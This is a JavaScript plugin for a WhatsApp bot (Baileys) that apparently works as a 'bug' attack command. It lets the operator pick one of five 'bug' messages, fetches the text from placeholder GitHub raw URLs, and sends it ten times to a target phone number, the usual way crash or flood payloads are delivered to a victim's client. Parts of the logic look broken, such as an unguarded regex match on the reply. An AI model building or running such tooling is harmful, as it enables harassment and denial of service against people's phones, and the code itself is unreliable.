import pkg, { generateWAMessageFromContent } from '@whiskeysockets/baileys';
import axios from 'axios';

const { proto } = pkg;

const bugCommand = async (m, Matrix) => {
    const bugOptions = [
        { title: 'Bug 1', id: 'bug_1' },
        { title: 'Bug 2', id: 'bug_2' },
        { title: 'Bug 3', id: 'bug_3' },
        { title: 'Bug 4', id: 'bug_4' },
        { title: 'Bug 5', id: 'bug_5' }
    ];

    const commandText = m.body.trim();
    
    // Check for the bug command and the number
    if (commandText.startsWith('bug ')) {
        const numberMatch = commandText.match(/bug (\d+)/);
        if (!numberMatch) return m.reply('Please provide a number to send messages to.');

        const phoneNumber = numberMatch[1];
        
        const msg = generateWAMessageFromContent(m.from, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: `📢 Select a Bug to Send to ${phoneNumber}`,
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: "Select a bug to send its message."
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "Select a Bug",
                                        sections: [
                                            {
                                                title: "Available Bugs",
                                                highlight_label: "Select a Bug",
                                                rows: bugOptions
                                            }
                                        ]
                                    })
                                }
                            ],
                        }),
                    }),
                },
            },
        }, {});

        await Matrix.relayMessage(m.key.remoteJid, msg.message, {
            messageId: msg.key.id
        });

    } else if (m.message?.interactiveResponseMessage) {
        const selectedButtonId = m.message.interactiveResponseMessage?.selectedId;
        
        if (selectedButtonId) {
            const phoneNumber = commandText.match(/bug (\d+)/)[1];

            // GitHub raw URLs for each bug message
            const githubRawUrls = {
                bug_1: 'https://raw.githubusercontent.com/yourusername/yourrepo/main/bug1.txt',
                bug_2: 'https://raw.githubusercontent.com/yourusername/yourrepo/main/bug2.txt',
                bug_3: 'https://raw.githubusercontent.com/yourusername/yourrepo/main/bug3.txt',
                bug_4: 'https://raw.githubusercontent.com/yourusername/yourrepo/main/bug4.txt',
                bug_5: 'https://raw.githubusercontent.com/yourusername/yourrepo/main/bug5.txt',
            };

            if (githubRawUrls[selectedButtonId]) {
                try {
                    const response = await axios.get(githubRawUrls[selectedButtonId]);
                    const messageToSend = response.data;

                    // Send the message 10 times
                    for (let i = 0; i < 10; i++) {
                        try {
                            await Matrix.sendMessage(phoneNumber, { text: messageToSend }, { quoted: m });
                        } catch (error) {
                            console.error("Error sending message:", error);
                        }
                    }
                    m.reply(`Sent the message for ${selectedButtonId} to ${phoneNumber} 10 times.`);
                } catch (error) {
                    m.reply('Error fetching the message from GitHub. Please check the URL.');
                    console.error("Error fetching message:", error);
                }
            } else {
                m.reply('Invalid selection. Please select a valid bug option.');
            }
        }
    }
};

export default bugCommand;
